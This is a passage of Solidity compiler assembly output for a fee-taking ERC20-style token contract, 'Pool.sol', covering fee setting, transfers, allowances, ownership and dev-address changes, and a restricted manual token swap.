swap1\n      revert\n    tag_231:\n        /* \"contracts/Pool/Pool.sol\":15504:15505  7 */\n      0x07\n        /* \"contracts/Pool/Pool.sol\":15489:15501  taxFeeOnSell */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":15489:15505  taxFeeOnSell < 7 */\n      lt\n        /* \"contracts/Pool/Pool.sol\":15481:15536  require(taxFeeOnSell < 7, \"Tax cannot be more than 6.\") */\n      tag_234\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_235\n      swap1\n      tag_233\n      jump\t// in\n    tag_235:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_234:\n        /* \"contracts/Pool/Pool.sol\":15563:15576  redisFeeOnBuy */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":15546:15560  _redisFeeOnBuy */\n      0x08\n        /* \"contracts/Pool/Pool.sol\":15546:15576  _redisFeeOnBuy = redisFeeOnBuy */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15604:15618  redisFeeOnSell */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":15586:15601  _redisFeeOnSell */\n      0x0a\n        /* \"contracts/Pool/Pool.sol\":15586:15618  _redisFeeOnSell = redisFeeOnSell */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15643:15654  taxFeeOnBuy */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":15628:15640  _taxFeeOnBuy */\n      0x09\n        /* \"contracts/Pool/Pool.sol\":15628:15654  _taxFeeOnBuy = taxFeeOnBuy */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15680:15692  taxFeeOnSell */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":15664:15677  _taxFeeOnSell */\n      0x0b\n        /* \"contracts/Pool/Pool.sol\":15664:15692  _taxFeeOnSell = taxFeeOnSell */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15157:15699  function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {... */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6590:6754  function transfer(address recipient, uint256 amount) public override returns (bool) {... */\n    tag_117:\n        /* \"contracts/Pool/Pool.sol\":6668:6672  bool */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6684:6726  _transfer(_msgSender(), recipient, amount) */\n      tag_237\n        /* \"contracts/Pool/Pool.sol\":6694:6706  _msgSender() */\n      tag_238\n        /* \"contracts/Pool/Pool.sol\":6694:6704  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":6694:6706  _msgSender() */\n      jump\t// in\n    tag_238:\n        /* \"contracts/Pool/Pool.sol\":6708:6717  recipient */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":6719:6725  amount */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":6684:6693  _transfer */\n      tag_154\n        /* \"contracts/Pool/Pool.sol\":6684:6726  _transfer(_msgSender(), recipient, amount) */\n      jump\t// in\n    tag_237:\n        /* \"contracts/Pool/Pool.sol\":6743:6747  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":6736:6747  return true */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6590:6754  function transfer(address recipient, uint256 amount) public override returns (bool) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":11525:11746  function setNewDevAddress(address payable dev) public onlyDev() {... */\n    tag_122:\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      tag_240\n        /* \"contracts/Pool/Pool.sol\":5981:5991  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":5981:5993  _msgSender() */\n      jump\t// in\n    tag_240:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      tag_241\n        /* \"contracts/Pool/Pool.sol\":5970:5975  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":5970:5977  owner() */\n      jump\t// in\n    tag_241:\n        /* \"contracts/Pool/Pool.sol\":5970:5993  owner() == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n      dup1\n      tag_242\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      tag_243\n        /* \"contracts/Pool/Pool.sol\":6020:6030  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":6020:6032  _msgSender() */\n      jump\t// in\n    tag_243:\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6016  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":5997:6032  _developmentAddress == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":5970:6032  owner() == _msgSender() || _developmentAddress == _msgSender() */\n    tag_242:\n        /* \"contracts/Pool/Pool.sol\":5962:6058  require(owner() == _msgSender() || _developmentAddress == _msgSender(), \"Caller is not the dev\") */\n      tag_244\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_245\n      swap1\n      tag_187\n      jump\t// in\n    tag_245:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_244:\n        /* \"contracts/Pool/Pool.sol\":11643:11646  dev */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":11604:11647  devAddressUpdated(_developmentAddress, dev) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":11622:11641  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":11604:11647  devAddressUpdated(_developmentAddress, dev) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfbbc329437e8c79f847e170730ad6dd04106b7511cad70d06d635886d92de83c\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":11680:11683  dev */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":11658:11677  _developmentAddress */\n      0x0e\n      0x01\n        /* \"contracts/Pool/Pool.sol\":11658:11683  _developmentAddress = dev */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":11735:11739  true */\n      0x01\n        /* \"contracts/Pool/Pool.sol\":11693:11711  _isExcludedFromFee */\n      0x05\n        /* \"contracts/Pool/Pool.sol\":11693:11732  _isExcludedFromFee[_developmentAddress] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":11712:11731  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":11693:11732  _isExcludedFromFee[_developmentAddress] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/Pool/Pool.sol\":11693:11739  _isExcludedFromFee[_developmentAddress] = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":11525:11746  function setNewDevAddress(address payable dev) public onlyDev() {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":14624:14883  function manualswap() external {... */\n    tag_125:\n        /* \"contracts/Pool/Pool.sol\":14689:14708  _developmentAddress */\n      0x0e\n      0x01\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14673:14708  _msgSender() == _developmentAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14673:14685  _msgSender() */\n      tag_248\n        /* \"contracts/Pool/Pool.sol\":14673:14683  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":14673:14685  _msgSender() */\n      jump\t// in\n    tag_248:\n        /* \"contracts/Pool/Pool.sol\":14673:14708  _msgSender() == _developmentAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14673:14745  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress */\n      dup1\n      tag_249\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":14728:14745  _marketingAddress */\n      0x0f\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14712:14745  _msgSender() == _marketingAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14712:14724  _msgSender() */\n      tag_250\n        /* \"contracts/Pool/Pool.sol\":14712:14722  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":14712:14724  _msgSender() */\n      jump\t// in\n    tag_250:\n        /* \"contracts/Pool/Pool.sol\":14712:14745  _msgSender() == _marketingAddress */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14673:14745  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress */\n    tag_249:\n        /* \"contracts/Pool/Pool.sol\":14673:14772  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner() */\n      dup1\n      tag_251\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":14765:14772  owner() */\n      tag_252\n        /* \"contracts/Pool/Pool.sol\":14765:14770  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":14765:14772  owner() */\n      jump\t// in\n    tag_252:\n        /* \"contracts/Pool/Pool.sol\":14749:14772  _msgSender() == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":14749:14761  _msgSender() */\n      tag_253\n        /* \"contracts/Pool/Pool.sol\":14749:14759  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":14749:14761  _msgSender() */\n      jump\t// in\n    tag_253:\n        /* \"contracts/Pool/Pool.sol\":14749:14772  _msgSender() == owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":14673:14772  _msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner() */\n    tag_251:\n        /* \"contracts/Pool/Pool.sol\":14665:14773  require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner()) */\n      tag_254\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_254:\n        /* \"contracts/Pool/Pool.sol\":14783:14806  uint256 contractBalance */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":14809:14833  balanceOf(address(this)) */\n      tag_255\n        /* \"contracts/Pool/Pool.sol\":14827:14831  this */\n      address\n        /* \"contracts/Pool/Pool.sol\":14809:14818  balanceOf */\n      tag_91\n        /* \"contracts/Pool/Pool.sol\":14809:14833  balanceOf(address(this)) */\n      jump\t// in\n    tag_255:\n        /* \"contracts/Pool/Pool.sol\":14783:14833  uint256 contractBalance = balanceOf(address(this)) */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":14843:14876  swapTokensForEth(contractBalance) */\n      tag_256\n        /* \"contracts/Pool/Pool.sol\":14860:14875  contractBalance */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":14843:14859  swapTokensForEth */\n      tag_257\n        /* \"contracts/Pool/Pool.sol\":14843:14876  swapTokensForEth(contractBalance) */\n      jump\t// in\n    tag_256:\n        /* \"contracts/Pool/Pool.sol\":14655:14883  {... */\n      pop\n        /* \"contracts/Pool/Pool.sol\":14624:14883  function manualswap() external {... */\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":15812:16042  function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {... */\n    tag_130:\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      tag_259\n        /* \"contracts/Pool/Pool.sol\":3255:3265  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      jump\t// in\n    tag_259:\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3251  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":3237:3295  require(_owner == _msgSender(), \"Caller is not the owner\") */\n      tag_260\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_261\n      swap1\n      tag_206\n      jump\t// in\n    tag_261:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_260:\n        /* \"contracts/Pool/Pool.sol\":15928:15937  uint256 i */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":15924:16036  for(uint256 i = 0; i < accounts.length; i++) {... */\n    tag_263:\n        /* \"contracts/Pool/Pool.sol\":15947:15955  accounts */\n      dup4\n      dup4\n        /* \"contracts/Pool/Pool.sol\":15947:15962  accounts.length */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":15943:15944  i */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":15943:15962  i < accounts.length */\n      lt\n        /* \"contracts/Pool/Pool.sol\":15924:16036  for(uint256 i = 0; i < accounts.length; i++) {... */\n      iszero\n      tag_264\n      jumpi\n        /* \"contracts/Pool/Pool.sol\":16017:16025  excluded */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":15983:16001  _isExcludedFromFee */\n      0x05\n        /* \"contracts/Pool/Pool.sol\":15983:16014  _isExcludedFromFee[accounts[i]] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":16002:16010  accounts */\n      dup7\n      dup7\n        /* \"contracts/Pool/Pool.sol\":16011:16012  i */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":16002:16013  accounts[i] */\n      dup2\n      dup2\n      lt\n      tag_266\n      jumpi\n      tag_267\n      tag_268\n      jump\t// in\n    tag_267:\n    tag_266:\n      swap1\n      pop\n      0x20\n      mul\n      add\n      0x20\n      dup2\n      add\n      swap1\n      tag_269\n      swap2\n      swap1\n      tag_90\n      jump\t// in\n    tag_269:\n        /* \"contracts/Pool/Pool.sol\":15983:16014  _isExcludedFromFee[accounts[i]] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      0x00\n        /* \"contracts/Pool/Pool.sol\":15983:16025  _isExcludedFromFee[accounts[i]] = excluded */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":15964:15967  i++ */\n      dup1\n      dup1\n      tag_270\n      swap1\n      tag_271\n      jump\t// in\n    tag_270:\n      swap2\n      pop\n      pop\n        /* \"contracts/Pool/Pool.sol\":15924:16036  for(uint256 i = 0; i < accounts.length; i++) {... */\n      jump(tag_263)\n    tag_264:\n      pop\n        /* \"contracts/Pool/Pool.sol\":15812:16042  function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":5059:5082  address public _factory */\n    tag_133:\n      0x13\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":6760:6901  function allowance(address owner, address spender) public view override returns (uint256) {... */\n    tag_139:\n        /* \"contracts/Pool/Pool.sol\":6841:6848  uint256 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6867:6878  _allowances */\n      0x04\n        /* \"contracts/Pool/Pool.sol\":6867:6885  _allowances[owner] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6879:6884  owner */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":6867:6885  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":6867:6894  _allowances[owner][spender] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":6886:6893  spender */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":6867:6894  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"contracts/Pool/Pool.sol\":6860:6894  return _allowances[owner][spender] */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":6760:6901  function allowance(address owner, address spender) public view override returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":3563:3720  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n    tag_144:\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      tag_274\n        /* \"contracts/Pool/Pool.sol\":3255:3265  _msgSender */\n      tag_149\n        /* \"contracts/Pool/Pool.sol\":3255:3267  _msgSender() */\n      jump\t// in\n    tag_274:\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3251  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3245:3267  _owner == _msgSender() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Pool/Pool.sol\":3237:3295  require(_owner == _msgSender(), \"Caller is not the owner\") */\n      tag_275\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_276\n      swap1\n      tag_206\n      jump\t// in\n    tag_276:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_275:\n        /* \"contracts/Pool/Pool.sol\":3677:3685  newOwner */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":3648:3686  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3669:3675  _owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":3648:3686  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":3705:3713  newOwner */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":3696:3702  _owner */\n      0x00\n      dup1\n        /* \"contracts/Pool/Pool.sol\":3696:3713  _owner = newOwner */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":3563:3720  function transferOwnership(address newOwner) public virtual onlyOwner {... */\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":1659:1755  function _msgSender() internal view virtual returns (address) {... */\n    tag_149:\n        /* \"contracts/Pool/Pool.sol\":1712:1719  address */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":1738:1748  msg.sender */\n      caller\n        /* \"contracts/Pool/Pool.sol\":1731:1748  return msg.sender */\n      swap1\n      pop\n        /* \"contracts/Pool/Pool.sol\":1659:1755  function _msgSender() internal view virtual returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":7642:7972  function _approve(address owner, address spender, uint256 amount) private {... */\n    tag_150:\n        /* \"contracts/Pool/Pool.sol\":7751:7752  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7734:7753  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":7734:7739  owner */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":7734:7753  owner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":7726:7794  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_280\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_281\n      swap1\n      tag_282\n      jump\t// in\n    tag_281:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_280:\n        /* \"contracts/Pool/Pool.sol\":7831:7832  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7812:7833  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":7812:7819  spender */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":7812:7833  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":7804:7872  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_283\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_284\n      swap1\n      tag_285\n      jump\t// in\n    tag_284:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_283:\n        /* \"contracts/Pool/Pool.sol\":7912:7918  amount */\n      dup1\n        /* \"contracts/Pool/Pool.sol\":7882:7893  _allowances */\n      0x04\n        /* \"contracts/Pool/Pool.sol\":7882:7900  _allowances[owner] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7894:7899  owner */\n      dup6\n        /* \"contracts/Pool/Pool.sol\":7882:7900  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":7882:7909  _allowances[owner][spender] */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":7901:7908  spender */\n      dup5\n        /* \"contracts/Pool/Pool.sol\":7882:7909  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"contracts/Pool/Pool.sol\":7882:7918  _allowances[owner][spender] = amount */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Pool/Pool.sol\":7949:7956  spender */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":7933:7965  Approval(owner, spender, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":7942:7947  owner */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":7933:7965  Approval(owner, spender, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n        /* \"contracts/Pool/Pool.sol\":7958:7964  amount */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":7933:7965  Approval(owner, spender, amount) */\n      mload(0x40)\n      tag_286\n      swap2\n      swap1\n      tag_53\n      jump\t// in\n    tag_286:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Pool/Pool.sol\":7642:7972  function _approve(address owner, address spender, uint256 amount) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Pool/Pool.sol\":8912:10325  function _transfer(address from, address to, uint256 amount) private {... */\n    tag_154:\n        /* \"contracts/Pool/Pool.sol\":9015:9016  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":8999:9017  from != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":8999:9003  from */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":8999:9017  from != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":8991:9059  require(from != address(0), \"ERC20: transfer from the zero address\") */\n      tag_288\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_289\n      swap1\n      tag_164\n      jump\t// in\n    tag_289:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_288:\n        /* \"contracts/Pool/Pool.sol\":9091:9092  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9077:9093  to != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9077:9079  to */\n      dup3\n        /* \"contracts/Pool/Pool.sol\":9077:9093  to != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      sub\n        /* \"contracts/Pool/Pool.sol\":9069:9133  require(to != address(0), \"ERC20: transfer to the zero address\") */\n      tag_290\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_291\n      swap1\n      tag_167\n      jump\t// in\n    tag_291:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_290:\n        /* \"contracts/Pool/Pool.sol\":9160:9161  0 */\n      0x00\n        /* \"contracts/Pool/Pool.sol\":9151:9157  amount */\n      dup2\n        /* \"contracts/Pool/Pool.sol\":9151:9161  amount > 0 */\n      gt\n        /* \"contracts/Pool/Pool.sol\":9143:9207  require(amount > 0, \"Transfer amount must be greater than zero\") */\n      tag_292\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_293\n      swap1\n      tag_170\n      jump\t// in\n    tag_293:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_292:\n        /* \"contracts/Pool/Pool.sol\":9238:9245  owner() */\n      tag_294\n        /* \"contracts/Pool/Pool.sol\":9238:9243  owner */\n      tag_103\n        /* \"contracts/Pool/Pool.sol\":9238:9245  owner() */\n      jump\t// in\n    tag_294:\n        /* \"contracts/Pool/Pool.sol\":9230:9245  from != owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Pool/Pool.sol\":9230:9234  from */\n      dup4\n        /* \"contracts/Pool/Pool.sol\":9230:9245  from != owner() */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"contracts/Pool/Pool.sol\":9230:9262  from != owner() && to != owner() */\n      dup1\n      iszero\n      tag_295\n      jumpi\n      pop\n        /* \"contracts/Pool/Pool.sol\":9255:9262  owner() */\n      tag_296\n        /* \"contracts/Pool/Pool.sol\":9255:9260  owner */\n    